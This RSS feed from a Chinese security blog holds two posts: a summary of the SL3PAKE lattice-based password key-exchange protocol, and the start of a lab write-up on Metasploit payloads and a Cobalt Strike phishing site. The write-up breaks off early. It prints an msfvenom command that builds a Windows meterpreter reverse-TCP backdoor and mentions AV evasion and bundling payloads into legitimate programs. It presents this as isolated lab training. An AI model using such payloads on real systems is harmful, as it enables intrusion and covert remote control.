<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>网络空间安全 on Leuco's Blog</title><link>http://localhost:1313/categories/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/</link><description>Recent content in 网络空间安全 on Leuco's Blog</description><generator>Hugo -- gohugo.io</generator><language>zh_CN</language><copyright>Leuco(leucoyuu@163.com)</copyright><lastBuildDate>Wed, 07 Jan 2026 13:01:39 +0800</lastBuildDate><atom:link href="http://localhost:1313/categories/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml"/><item><title>【格基加密】SL3PAKE协议</title><link>http://localhost:1313/p/%E6%A0%BC%E5%9F%BA%E5%8A%A0%E5%AF%86sl3pake%E5%8D%8F%E8%AE%AE/</link><pubDate>Wed, 07 Jan 2026 13:01:39 +0800</pubDate><guid>http://localhost:1313/p/%E6%A0%BC%E5%9F%BA%E5%8A%A0%E5%AF%86sl3pake%E5%8D%8F%E8%AE%AE/</guid><description>&lt;img src="http://localhost:1313/p/%E6%A0%BC%E5%9F%BA%E5%8A%A0%E5%AF%86sl3pake%E5%8D%8F%E8%AE%AE/cover.png" alt="Featured image of post 【格基加密】SL3PAKE协议" /&gt;&lt;h1 id="sl3pake协议"&gt;SL3PAKE协议
&lt;/h1&gt;&lt;div class="custom-toc"&gt;
&lt;h3&gt;目录&lt;/h3&gt;
&lt;nav id="TableOfContents"&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#参考文献"&gt;参考文献&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#基础信息"&gt;基础信息&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#困难性基础"&gt;困难性基础&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#三方参与"&gt;三方参与&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#符号表"&gt;符号表&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#协议流程"&gt;协议流程&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#server-s初始化设置"&gt;Server S：初始化设置&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#client-a实例化会话"&gt;Client A：实例化会话&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#client-a--client-b"&gt;Client A =&amp;gt; Client B&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#client-b实例化会话"&gt;Client B：实例化会话&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#client-b--server-s"&gt;Client B =&amp;gt; Server S&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#server-s客户端身份认证"&gt;Server S：客户端身份认证&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#对-client-a-的身份认证"&gt;对 Client A 的身份认证&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#对-client-b-的身份认证"&gt;对 Client B 的身份认证&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#server-s协助-client-a-和-client-b-建立协商密钥"&gt;Server S：协助 Client A 和 Client B 建立协商密钥&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#对于-client-a-"&gt;对于 Client A ：&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#对于-client-b"&gt;对于 Client B：&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#server-s--client-b"&gt;Server S =&amp;gt; Client B&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#client-b验证-s-身份并与-a-协商密钥"&gt;Client B：验证 S 身份并与 A 协商密钥&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#验证-server-s-的身份"&gt;验证 Server S 的身份&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#与-client-a-完成协商"&gt;与 Client A 完成协商&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#client-b--client-a"&gt;Client B =&amp;gt; Client A&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#client-a验证-s-身份并与-b-协商密钥"&gt;Client A：验证 S 身份并与 B 协商密钥&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#验证-server-s-的身份-1"&gt;验证 Server S 的身份&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#与-client-b-完成协商"&gt;与 Client B 完成协商&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#完成密钥协商"&gt;完成密钥协商&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/nav&gt;
&lt;/div&gt;
&lt;h2 id="参考文献"&gt;参考文献
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;引用格式（IEEE）：&lt;/p&gt;
&lt;p&gt;[1] V. Dabra, S. Kumari, A. Bala, and S. Yadav, “SL3PAKE: Simple Lattice-based Three-party Password Authenticated Key Exchange for post-quantum world,” &lt;em&gt;Journal of Information Security and Applications&lt;/em&gt;, vol. 84, p. 103826, Aug. 2024, doi: &lt;a class="link" href="https://doi.org/10.1016/j.jisa.2024.103826" target="_blank" rel="noopener"
&gt;10.1016/j.jisa.2024.103826&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;网址：https://www.sciencedirect.com/science/article/pii/S2214212624001297&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;附件：[文献原文](Dabra 等 - 2024 - SL3PAKE Simple Lattice-based Three-party Password Authenticated Key Exchange for post-quantum world.pdf)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="基础信息"&gt;基础信息
&lt;/h2&gt;&lt;h3 id="困难性基础"&gt;困难性基础
&lt;/h3&gt;&lt;p&gt;​ SL3PAKE的困难性建立在 RLW 问题的计算困难性上，RLWE问题可以归约到格中的最短向量问题（SVP）或最近向量问题（CVP）&lt;/p&gt;
&lt;h3 id="三方参与"&gt;三方参与
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Server(S)&lt;/strong&gt;：SL3PAKE服务器&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ClientA(A)&lt;/strong&gt;：密钥交换客户端A&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ClientB(B)&lt;/strong&gt;：密钥交换客户端B&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="符号表"&gt;符号表
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;$n$：满足 $n=2k$ 的正整数（安全参数），其中 $k$ 为任意正数&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;$q$：满足 $q\equiv 1 \ (mod\ 2n)$ 的大奇素数&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;$R$：&lt;/p&gt;
$$\displaystyle{\frac{\mathbb{Z}\left[x\right]}{\left&lt;f(x)\right&gt;} = \frac{\mathbb{Z}\left[x\right]}{\left&lt; x^n+1 \right&gt;}}$$&lt;p&gt; （多项式商环，其中 $f(x)$ 为分圆多项式）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;$R_q$：&lt;/p&gt;
$$\displaystyle{\frac{R}{qR}}$$&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;$\chi_\beta$：$R_q$ 上的标准差为 $\beta$ 的离散高斯分布&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;$e\leftarrow \chi_\beta$：来自 $\chi_\beta$ 中的随机样本&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;$a\in_{ru}R_q$ ：从 $R_q$ 中的随机均匀的选取样本&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;$x_S,s_S$：S的公钥与私钥&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;$x_A,s_A$：A的公钥与私钥&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;$x_B,s_B$：B的公钥与私钥&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;$P,Q$：将字符串 $P$ 和 $Q$ 串联拼接合并&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;$E$：近0集合，&lt;/p&gt;
$$\displaystyle{E=\left\{ -\left\lfloor \frac{q}{4} \right\rfloor \cdots \left\lfloor \frac{q}{4} \right\rceil \right\}}$$&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;$\operatorname{Cha}(m)$：特征函数，
&lt;/p&gt;
$$
&amp;\operatorname{Cha}(m) =
\begin{cases}
0, \quad &amp; if\ m\in E \\
1, &amp; else\\
\end{cases}\\
$$&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;$\operatorname{Mod_2}(m,n)$：校验函数，
&lt;/p&gt;
$$
\operatorname{Mod_2}(m,n) = \left(m+n\cdot\frac{q-1}{2} \right)\ \ mod\ q \ \ mod\ 2
$$&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;$\operatorname{h_0}(\cdot)$：哈希函数，$\operatorname{h_0}:{0,1}^* \rightarrow R_q$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;$\operatorname{h_1}(\cdot)$：哈希函数，$\operatorname{h_0}:{0,1}^* \rightarrow {0,1}^g$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;$\operatorname{h_2}(\cdot)$：哈希函数，$\operatorname{h_0}:{0,1}^* \rightarrow \chi_\beta$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;$pw_A$：A的口令&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;$pw_B$：B的口令&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="协议流程"&gt;协议流程
&lt;/h2&gt;&lt;h3 id="server-s初始化设置"&gt;Server S：初始化设置
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;S选择安全参数 $n$ 与奇素数 $q$&lt;/li&gt;
&lt;li&gt;S选择离散高斯分布 $\chi_\beta$ 以及 $a\in_{ru}R_q$&lt;/li&gt;
&lt;li&gt;S计算服务器公钥 $x_S = a\cdot s_S + 2e_S$，其中 $ s_S,e_S\leftarrow \chi_\beta$&lt;/li&gt;
&lt;li&gt;S选取哈希函数 $\operatorname{h_0}(\cdot)$、$\operatorname{h_1}(\cdot)$、$\operatorname{h_2}(\cdot)$&lt;/li&gt;
&lt;li&gt;S通过安全信道接受A和B的口令的哈希值 $\operatorname{h_0}(pw_A)$ 和 $\operatorname{h_0}(pw_B)$&lt;/li&gt;
&lt;li&gt;S生成并公开S、A、B的身份标识 $ID_S$、$ID_A$、$ID_B$&lt;/li&gt;
&lt;li&gt;S保存参数：$\left{s_S,\operatorname{h_0}(pw_A),\operatorname{h_0}(pw_B) \right}$&lt;/li&gt;
&lt;li&gt;S公开参数：$\left{n,q,\chi_\beta,a,x_S,ID_A,ID_B,ID_S,\operatorname{h_0}(\cdot),\operatorname{h_1}(\cdot),\operatorname{h_2}(\cdot) \right}$&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="client-a实例化会话"&gt;Client A：实例化会话
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Input&lt;/strong&gt;：$ID_A$ ， $pw_A$&lt;/li&gt;
&lt;li&gt;$x_A = a\cdot s_A + 2e_A$，其中 $s_A,e_A\leftarrow \chi_\beta$&lt;/li&gt;
&lt;li&gt;$x^*_A = x_A + \operatorname{h_0}(pw_A)$&lt;/li&gt;
&lt;li&gt;$h_{AS} = \operatorname{h_1}(ID_A,ID_S,x_A,x^*_A)$&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="client-a--client-b"&gt;Client A =&amp;gt; Client B
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;$A\Rightarrow B: \left{ID_A,x^*&lt;em&gt;A,h&lt;/em&gt;{AS}\right}$&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="client-b实例化会话"&gt;Client B：实例化会话
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Input&lt;/strong&gt;：$ID_B$ ， $pw_B$&lt;/li&gt;
&lt;li&gt;$x_B = a\cdot s_B + 2e_B$，其中 $s_B,e_B\leftarrow \chi_\beta$&lt;/li&gt;
&lt;li&gt;$x^*_B = x_B + \operatorname{h_0}(pw_B)$&lt;/li&gt;
&lt;li&gt;$h_{BS} = \operatorname{h_1}(ID_B,ID_S,x_B,x^*_B)$&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="client-b--server-s"&gt;Client B =&amp;gt; Server S
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;$B\Rightarrow S: \left{ID_A,ID_B,x^&lt;em&gt;_A,x^&lt;/em&gt;&lt;em&gt;B,h&lt;/em&gt;{AS},h_{BS}\right}$&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="server-s客户端身份认证"&gt;Server S：客户端身份认证
&lt;/h3&gt;&lt;h4 id="对-client-a-的身份认证"&gt;对 Client A 的身份认证
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;$x&amp;rsquo;_A = x^*_A - \operatorname{h_0}(pw_A)$，这里有 $x_A == x&amp;rsquo;_A$&lt;/li&gt;
&lt;li&gt;**Check if ** $h_{AS} \overset{?}{==} \operatorname{h_1}(ID_A,ID_S,x&amp;rsquo;_A,x^*_A)$&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;If not, then abort.&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id="对-client-b-的身份认证"&gt;对 Client B 的身份认证
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;$x&amp;rsquo;_B = x^*_B - \operatorname{h_0}(pw_B)$，这里有 $x_B == x&amp;rsquo;_B$&lt;/li&gt;
&lt;li&gt;**Check if ** $h_{BS} \overset{?}{==} \operatorname{h_1}(ID_B,ID_S,x&amp;rsquo;_B,x^*_B)$&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;If not, then abort.&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="server-s协助-client-a-和-client-b-建立协商密钥"&gt;Server S：协助 Client A 和 Client B 建立协商密钥
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;$x_S = a\cdot s_S +2e_S $，其中 $ s_S,e_S\leftarrow \chi_\beta$&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id="对于-client-a-"&gt;对于 Client A ：
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;$c_A = x&amp;rsquo;&lt;em&gt;B\cdot s_S + 2f&lt;/em&gt;{S_4}$，其中 $f_{S_4} \leftarrow \chi_\beta$&lt;/li&gt;
&lt;li&gt;$m = \operatorname{h_2}(ID_S,ID_A,x_S,x&amp;rsquo;_A)$&lt;/li&gt;
&lt;li&gt;$k_{SA}=(x&amp;rsquo;&lt;em&gt;A\cdot s_S+2m)\cdot m+2f&lt;/em&gt;{S_1}$，其中 $f_{S_1} \leftarrow \chi_\beta$&lt;/li&gt;
&lt;li&gt;$\omega_{SA} = \operatorname{Cha}(k_{SA})$&lt;/li&gt;
&lt;li&gt;$\sigma_{SA} = \operatorname{Mod_2}(k_{SA},\omega_{SA})$&lt;/li&gt;
&lt;li&gt;$\alpha_{SA}=\operatorname{h_1}(ID_A,ID_B,ID_S,c_A,x&amp;rsquo;&lt;em&gt;A,\sigma&lt;/em&gt;{SA})$&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id="对于-client-b"&gt;对于 Client B：
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;$c_B = x&amp;rsquo;&lt;em&gt;A\cdot s_S + 2f&lt;/em&gt;{S_5}$，其中 $f_{S_5} \leftarrow \chi_\beta$&lt;/li&gt;
&lt;li&gt;$n = \operatorname{h_2}(ID_S,ID_B,x_S,x&amp;rsquo;_B)$&lt;/li&gt;
&lt;li&gt;$k_{SB}=(x&amp;rsquo;&lt;em&gt;B\cdot s_S+2n)\cdot n+2f&lt;/em&gt;{S_3}$，其中 $f_{S_3} \leftarrow \chi_\beta$&lt;/li&gt;
&lt;li&gt;$\omega_{SB} = \operatorname{Cha}(k_{SB})$&lt;/li&gt;
&lt;li&gt;$\sigma_{SB} = \operatorname{Mod_2}(k_{SB},\omega_{SB})$&lt;/li&gt;
&lt;li&gt;$\alpha_{SB}=\operatorname{h_1}(ID_A,ID_B,ID_S,c_B,x&amp;rsquo;&lt;em&gt;B,\sigma&lt;/em&gt;{SB})$&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="server-s--client-b"&gt;Server S =&amp;gt; Client B
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;$S\Rightarrow B: \left{c_A,c_B,x_S,\omega_{SA},\omega_{SB},\alpha_{SA},\alpha_{SB}\right}$&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="client-b验证-s-身份并与-a-协商密钥"&gt;Client B：验证 S 身份并与 A 协商密钥
&lt;/h3&gt;&lt;h4 id="验证-server-s-的身份"&gt;验证 Server S 的身份
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;$n = \operatorname{h_2}(ID_S,ID_B,x_S,x_B)$&lt;/li&gt;
&lt;li&gt;$k_{BS}=(x_S\cdot s_B+2n)\cdot n+2f_{B_1}$，其中 $f_{B_1} \leftarrow \chi_\beta$&lt;/li&gt;
&lt;li&gt;$\sigma_{BS} = \operatorname{Mod_2}(k_{BS},\omega_{SB})$&lt;/li&gt;
&lt;li&gt;$\alpha_{BS}=\operatorname{h_1}(ID_A,ID_B,ID_S,c_B,x_B,\sigma_{BS})$&lt;/li&gt;
&lt;li&gt;**Check if ** $\alpha_{BS} \overset{?}{==} \alpha_{SB}$&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;If not, then abort.&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id="与-client-a-完成协商"&gt;与 Client A 完成协商
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;$\nu_{BA} = c_B\cdot s_B +2f_{B_2}$，其中 $f_{B_2} \leftarrow \chi_\beta$&lt;/li&gt;
&lt;li&gt;$\omega_{BA}=\operatorname{Cha}(\nu_{BA})$&lt;/li&gt;
&lt;li&gt;$\sigma_{BA}=\operatorname{Mod_2}(\nu_{BA},\omega_{BA})$&lt;/li&gt;
&lt;li&gt;$sk_{BA} = \operatorname{h_1}(ID_A,ID_B,ID_S,x^&lt;em&gt;_A,x^&lt;/em&gt;&lt;em&gt;B,\sigma&lt;/em&gt;{BA})$&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="client-b--client-a"&gt;Client B =&amp;gt; Client A
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;$B\Rightarrow A: \left{ID_B,x^*&lt;em&gt;B,c_A,x_S,\omega&lt;/em&gt;{BA},\omega_{SA},\alpha_{SA}\right}$&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="client-a验证-s-身份并与-b-协商密钥"&gt;Client A：验证 S 身份并与 B 协商密钥
&lt;/h3&gt;&lt;h4 id="验证-server-s-的身份-1"&gt;验证 Server S 的身份
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;$m = \operatorname{h_2}(ID_S,ID_A,x_S,x_A)$&lt;/li&gt;
&lt;li&gt;$k_{AS}=(x_S\cdot s_A+2m)\cdot m+2f_{A_1}$，其中 $f_{A_1} \leftarrow \chi_\beta$&lt;/li&gt;
&lt;li&gt;$\sigma_{AS} = \operatorname{Mod_2}(k_{AS},\omega_{SA})$&lt;/li&gt;
&lt;li&gt;$\alpha_{AS}=\operatorname{h_1}(ID_A,ID_B,ID_S,c_A,x_A,\sigma_{AS})$&lt;/li&gt;
&lt;li&gt;**Check if ** $\alpha_{AS} \overset{?}{==} \alpha_{SA}$&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;If not, then abort.&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id="与-client-b-完成协商"&gt;与 Client B 完成协商
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;$\nu_{AB} = c_A\cdot s_A +2f_{A_2}$，其中 $f_{A_2} \leftarrow \chi_\beta$&lt;/li&gt;
&lt;li&gt;$\sigma_{AB}=\operatorname{Mod_2}(\nu_{AB},\omega_{BA})$&lt;/li&gt;
&lt;li&gt;$sk_{AB} = \operatorname{h_1}(ID_A,ID_B,ID_S,x^&lt;em&gt;_A,x^&lt;/em&gt;&lt;em&gt;B,\sigma&lt;/em&gt;{AB})$&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="完成密钥协商"&gt;完成密钥协商
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;协商密钥：$sk_{BA} == sk_{AB}$&lt;/li&gt;
&lt;/ul&gt;</description></item><item><title>【攻防实践】MSF恶意程序利用与CS钓鱼网站制作</title><link>http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/</link><pubDate>Sat, 03 Jan 2026 13:48:09 +0800</pubDate><guid>http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/</guid><description>&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/CS.png" alt="Featured image of post 【攻防实践】MSF恶意程序利用与CS钓鱼网站制作" /&gt;&lt;h1 id="msf恶意程序利用与cs钓鱼网站制作"&gt;MSF恶意程序利用与CS钓鱼网站制作
&lt;/h1&gt;&lt;div class="custom-toc"&gt;
&lt;h3&gt;目录&lt;/h3&gt;
&lt;nav id="TableOfContents"&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#实践概览"&gt;实践概览&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#msfvenom"&gt;MSFVenom&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#cobalt-strike"&gt;Cobalt Strike&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#环境配置"&gt;环境配置&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#实践步骤"&gt;实践步骤&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#mfs恶意程序利用"&gt;MFS恶意程序利用&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#使用msfvenom制作恶意软件"&gt;使用msfvenom制作恶意软件&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#制作监听程序"&gt;制作监听程序&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#将恶意程序传输下载到靶机"&gt;将恶意程序传输下载到靶机&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#等待靶机执行恶意程序"&gt;等待靶机执行恶意程序&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#cs钓鱼网站制作"&gt;CS钓鱼网站制作&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#cobalt-strike安装"&gt;Cobalt Strike安装&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#更改cs读写权限"&gt;更改CS读写权限&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#生成cobalt-strike服务器组"&gt;生成Cobalt Strike服务器组&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#打开cobalt-strike客户端并连接服务器组"&gt;打开Cobalt Strike客户端并连接服务器组&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#创建监听器"&gt;创建监听器&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#网站克隆与web日志"&gt;网站克隆与Web日志&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#靶机访问钓鱼网站"&gt;靶机访问钓鱼网站&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#键盘记录"&gt;键盘记录&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#cs菜单功能概览"&gt;CS菜单功能概览&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#视图"&gt;视图&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#攻击"&gt;攻击&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/nav&gt;
&lt;/div&gt;
&lt;h2 id="实践概览"&gt;实践概览
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;名称&lt;/strong&gt;：MSF恶意程序利用与CS上线&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;目的&lt;/strong&gt;：使用MSFVenom恶意软件获取shell；使用Cobalt Strike制作钓鱼网站并监听键盘&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;时间&lt;/strong&gt;：2026年1月3日&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;风险说明&lt;/strong&gt;：本实验在完全隔离的虚拟化实验室环境下进行，仅用于教育或授权测试&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="msfvenom"&gt;MSFVenom
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;定义：&lt;/strong&gt; msfvenom 是 &lt;strong&gt;Metasploit Framework&lt;/strong&gt; 的一部分，它是一个独立的 &lt;strong&gt;攻击载荷生成器&lt;/strong&gt;。它取代了旧版的 &lt;code&gt;msfpayload&lt;/code&gt; 和 &lt;code&gt;msfencode&lt;/code&gt; 工具，用于创建和编码各种格式的 shellcode 或可执行文件。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;主要功能：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;生成载荷：&lt;/strong&gt; 可以生成适用于几乎所有操作系统（Windows, Linux, macOS, Android等）和架构（x86, x64, ARM等）的攻击载荷。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;多种格式：&lt;/strong&gt; 输出格式多样，如可执行文件（.exe, .elf）、动态链接库（.dll）、Web脚本（.php, .aspx）、Shell代码（C、Python、Ruby等格式的原始字节）等。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;编码与规避：&lt;/strong&gt; 内置多种编码器（如 &lt;code&gt;x86/shikata_ga_nai&lt;/code&gt;），可以对生成的载荷进行混淆，以绕过基础的静态杀毒软件（AV）检测。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;捆绑：&lt;/strong&gt; 可以将攻击载荷与一个正常的合法程序（如计算器、PDF阅读器）捆绑在一起，诱骗目标运行。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;转换格式：&lt;/strong&gt; 可以将载荷在不同格式之间转换。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;典型工作流程：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;红队人员决定攻击目标（例如：Windows 10 x64）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用 msfvenom 命令生成一个反向 TCP 连接的 Windows 后门：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp &lt;span class="nv"&gt;LHOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;攻击机 &lt;span class="nv"&gt;LPORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt; -f exe -o payload.exe
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
